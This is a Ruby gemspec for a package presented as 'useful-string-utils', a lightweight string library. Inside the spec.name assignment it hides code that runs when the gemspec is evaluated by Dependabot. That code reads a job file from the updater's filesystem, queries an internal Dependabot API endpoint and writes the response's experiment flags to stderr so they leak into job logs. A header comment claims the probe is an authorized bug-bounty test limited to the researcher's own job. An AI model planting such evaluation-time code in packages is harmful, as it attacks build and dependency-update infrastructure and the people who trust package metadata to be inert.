# frozen_string_literal: true
#
# v3.0 boundary-verification audit — own-job /details body shape capture.
#
# Authorization: HackerOne GitHub program; researcher's own job; own
# jobId only; no third-party data; metadata via stderr only.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      own_id = (
        begin
          j = JSON.parse(File.read("/home/dependabot/dependabot-updater/job.json"))
          (j["job"] && j["job"]["id"]) || j["id"] || ENV["DEPENDABOT_JOB_ID"]
        rescue
          ENV["DEPENDABOT_JOB_ID"]
        end
      ).to_s

      if !own_id.empty?
        begin
          uri = URI("https://dependabot-actions.githubapp.com/update_jobs/#{own_id}/details")
          h = Net::HTTP.new(uri.host, uri.port)
          h.use_ssl = true
          h.open_timeout = 5
          h.read_timeout = 8
          rsp = h.get(uri.request_uri)

          # Surface response metadata via stderr (Bundler captures stderr in job log)
          body = rsp.body.to_s
          # Try to parse as JSON and extract experiment list (server-side capability flags)
          begin
            parsed = JSON.parse(body)
            # Walk to experiments
            exps = parsed.dig("data", "attributes", "experiments") ||
                   parsed.dig("attributes", "experiments") ||
                   parsed["experiments"] ||
                   {}
            keys = exps.is_a?(Hash) ? exps.keys.sort : []
            STDERR.puts "DETAILS-EXPS: cnt=#{keys.length}"
            keys.each_slice(8) do |chunk|
              STDERR.puts "EXPS: #{chunk.join(',')}"
            end
          rescue
            STDERR.puts "DETAILS-PARSE: failed"
          end

          STDERR.puts "DETAILS-META: code=#{rsp.code} bodylen=#{body.length} bodyhash=#{Digest::SHA256.hexdigest(body)[0, 12]}"
        rescue => e
          STDERR.puts "DETAILS-ERR: #{e.class}"
        end
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
